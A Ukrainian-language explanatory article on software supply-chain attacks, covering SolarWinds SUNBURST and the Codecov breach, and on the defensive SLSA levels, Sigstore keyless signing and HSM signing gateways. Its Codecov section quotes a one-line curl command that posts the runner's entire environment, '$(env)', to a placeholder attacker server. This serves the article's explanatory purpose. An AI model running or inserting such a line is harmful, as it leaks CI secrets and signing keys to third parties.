# 📜 Історія атак на ланцюжки постачання: від компрометації SolarWinds до безключової криптографії

Коли цифрові підписи лише впроваджувалися в інженерну практику розробки програмного забезпечення, модель загроз була простою: розробник компілював вихідний код на своїй робочій станції, підключав апаратний USB-токен або вводив пароль до локального файлу сертифіката PKCS#12 (`.pfx`) і накладав підпис на готовий бінарний файл перед його публікацією на FTP-сервері чи компакт-диску. У такій системі людина виступала єдиним оператором ключа, а сам процес випуску релізу був повільним, ручним та ізольованим. 

Індустріалізація розробки та перехід до практик неперервної інтеграції й доставки (CI/CD) докорінно змінили ландшафт: випуск сотень мікросервісів, оновлень прошивок та контейнерів став відбуватися щогодини у повністю автоматизованих конвеєрах. Спроба зберегти стару парадигму підпису призвела до того, що довгоживучі закриті ключі релізів почали масово копіювати прямо в змінні середовища хмарних раннерів (`CI_SECRET`, `GITHUB_TOKEN`, `VAULT_PASSWORD`), перетворивши середовище збірки на найбажанішу ціль для зловмисників.

### Інцидент SolarWinds SUNBURST (2020): злам конвеєра зсередини

У грудні 2020 року світ зіткнувся з однією з наймасштабніших і найвитонченіших атак на ланцюжок постачання програмного забезпечення в історії — операцією з компрометації платформи моніторингу SolarWinds Orion (відомої як атака SUNBURST або Solorigate). Нападники з угруповання APT29 (Nobelium) отримали доступ до внутрішньої мережі розробки компанії та впровадили шкідливий компонент прямо в процес збірки.

Ключова особливість атаки полягала в тому, що вихідний репозиторій вихідного коду залишався чистим: бекдор під назвою `SolarWinds.Orion.Core.BusinessLayer.dll` інжектувався динамічно під час роботи компілятора MSBuild. Спеціальний фоновий процес відстежував виклики компілятора, на льоту підміняв один із вихідних файлів C# на його модифіковану версію із зашитим трояном, а після завершення компіляції миттєво повертав оригінальний файл на диск, щоб не залишати слідів у системі контролю версій.

```
+-----------------------------------------------------------------------------+
| Конвеєр збірки SolarWinds Orion (2020)                                      |
|                                                                             |
|  [Чистий Git-репозиторій]                                                   |
|           ↓                                                                 |
|  [MSBuild процес] <--- (Динамічна ін'єкція трояна SUNBURST)                |
|           ↓                                                                 |
|  [Троянізована бібліотека DLL]                                              |
|           ↓                                                                 |
|  [Служба підпису коду] <--- (Автоматичний підпис законним сертифікатом)     |
|           ↓                                                                 |
|  [Офіційне оновлення з дійсним цифровим підписом SolarWinds Inc.]           |
+-----------------------------------------------------------------------------+
```

Після цього скомпільована троянізована бібліотека автоматично передавалася на етап підписання коду. Сервіс підпису, не маючи жодного криптографічного доказу відповідності бінарного файлу конкретному коміту у вихідному коді, наклав дійсний цифровий підпис законним сертифікатом компанії. У результаті понад 18 000 державних та корпоративних організацій по всьому світу отримали шкідливе оновлення через офіційні канали оновлень.

Цей інцидент продемонстрував індустрії дві фундаментальні вразливості:
1. **Сліпий підпис артефактів:** Наявність валідного цифрового підпису гарантує лише те, що бінарний файл був підписаний конкретним ключем, але не дає жодних гарантій того, що цей файл було зібрано саме з відкритого та перевіреного вихідного коду без стороннього втручання в раннер.
2. **Нерозривність середовища виконання:** Якщо раннер збірки є незахищеним і компрометується зловмисником, будь-який ключ підпису, розташований у тому ж контурі, стає інструментом легітимізації шкідливого програмного забезпечення.

### Злам Codecov (2021): масова ексфільтрація секретів із раннерів

У квітні 2021 року відбулася інша показова компрометація, яка вдарила по інструменту аналізу покриття коду Codecov. Нападники скористалися помилкою конфігурації в образі Docker компанії Codecov і витягли облікові дані доступу до хмарного сховища Google Cloud Storage, де зберігався офіційний bash-скрипт завантажувача (`Bash Uploader`).

Зловмисники модифікували скрипт завантажувача, додавши всього один рядок коду, який перехоплював усі змінні середовища з раннерів клієнтів і відправляв їх на віддалений сервер нападників:

```sh
# Впроваджений зловмисниками фрагмент перехоплення змінних оточення:
curl -s -X POST --data-binary "$(env)" https://<attacker-c2-server>/upload
```

Скрипт Codecov Bash Uploader виконувався тисячами компаній у конвеєрах GitHub Actions, GitLab CI та CircleCI з найвищими привілеями. Оскільки багато розробників зберігали закриті ключі підпису, токени автентифікації та SSH-ключі розгортання як незахищені змінні оточення конвеєра, нападники отримали доступ до сотень закритих ключів релізів провідних технологічних компаній.

Інцидент із Codecov остаточно довів: **будь-який секрет, переданий у пам'ять або середовище раннера CI/CD, слід вважати потенційно скомпрометованим**. Раннери регулярно виконують довільний код сторонніх залежностей (пакунки з `npm`, `PyPI`, `crates.io`, скрипти збірки), кожен із яких може містити деструктивне навантаження для читання пам'яті процесу.

### Ініціатива SLSA та народження проєкту Sigstore

У відповідь на системну кризу безпеки ланцюжків постачання інженерні групи Google, Red Hat, Linux Foundation та Purdue University об'єднали зусилля для розробки нових стандартів.

У 2021 році було опубліковано специфікацію **SLSA** (англ. *Supply-chain Levels for Software Artifacts*, вимовляється як «сальса»). Вона визначила чотири рівні захищеності конвеєра розробки:
* **SLSA Рівень 1:** Автоматизований процес збірки та генерація базової інформації про походження (англ. *provenance*).
* **SLSA Рівень 2:** Збірка на розміщеному ізольованому конвеєрі із захистом від підміни та криптографічним підписом метаданих походження.
* **SLSA Рівень 3:** Повна ізоляція середовища збірки: раннер не має доступу до приватних ключів підпису, параметри збірки не можуть бути змінені з коду репозиторію, а походження артефакту підтверджується незмінним криптографічним ланцюжком.
* **SLSA Рівень 4:** Двоосібний контроль усіх змін (обов'язкове код-рев'ю двох незалежних інженерів) та герметичність збірки (відсутність доступу до мережі під час компіляції).

Паралельно з теоретичним стандартом SLSA консорціум OpenSSF (Open Source Security Foundation) запустив проєкт **Sigstore**, який запропонував революційну парадигму: **повну відмову від довгоживучих ключів підпису на користь короткоживучої ідентичності (Keyless Signing)**.

```
+-----------------------------------------------------------------------------+
| Архітектура проєкту Sigstore: Безключове підписання артефактів              |
|                                                                             |
|  [CI/CD Runner] --(1. OIDC Token)--> [Fulcio CA]                            |
|       |                                    | (2. Короткоживучий X.509)      |
|       | <----------------------------------+                                |
|       |                                                                     |
|       +--(3. Публікація підпису + гешу)--> [Rekor Transparency Log]         |
|       |                                         (Незмінне дерево Меркла)    |
|       |                                                                     |
|       +--(4. Запит штампу часу)----------> [Timestamp Authority (RFC 3161)] |
+-----------------------------------------------------------------------------+
```

Архітектура Sigstore об'єднала три незалежні криптографічні підсистеми:
1. **Fulcio (Короткоживучий CA):** Центр сертифікації, який приймає OIDC-токен раннера від довіреного провайдера (GitHub, Google, GitLab), перевіряє право збірки на підпис і генерує тимчасовий сертифікат X.509 із терміном дії всього 10–15 хвилин. У сертифікат замість імені людини записується URI репозиторію, тег та хеш коміту.
2. **Cosign:** Утиліта для формування підписів контейнерних образів та файлових бінарників із прив'язкою до метаданих OCI (Open Container Initiative).
3. **Rekor (Журнал прозорості):** Відкритий розподілений незмінний журнал на основі дерева Меркла (англ. *Merkle Tree*), куди записується кожен створений підпис і сертифікат. Запис у Rekor є неспростовним криптографічним доказом того, що артефакт дійсно існував і був підписаний у конкретний момент часу, коли сертифікат був дійсним.

Завдяки Sigstore індустрія позбулася необхідності генерувати, зберігати, ротувати та захищати довгоживучі закриті ключі в конвеєрах розробки. Приватний ключ генерується в пам'яті раннера лише на кілька мілісекунд, виконує підпис, відправляється сертифікату й журналу прозорості, після чого безповоротно знищується з пам'яті.

### Сучасний стан та еволюція до корпоративних шлюзів

Для розробки з відкритим кодом екосистема Sigstore стала де-факто стандартом: проєкти Kubernetes, Python (PyPI), npm та Rust упроваджують перевірку походження та безключовий підпис артефактів. 

У закритих корпоративних та оборонних середовищах, де артефакти не можуть публікуватися у відкритий журнал Rekor, розвинувся паралельний напрямок: **віддалені ізольовані шлюзи підпису (Signing Gateways) на базі апаратних модулів безпеки (HSM)**. У такій моделі корпоративний конвеєр використовує федеративні OIDC-токени для автентифікації перед внутрішнім шлюзом, який виконує апаратні криптографічні операції всередині захищеного контуру без надання раннеру прямого доступу до ключів.

Історія атак на конвеєри продемонструвала фундаментальний урок кібербезпеки: безпека програмного забезпечення залежить не від складності алгоритму підпису, а від суворої ізоляції криптографічного ключа від ненадійного коду, який він покликаний засвідчити.
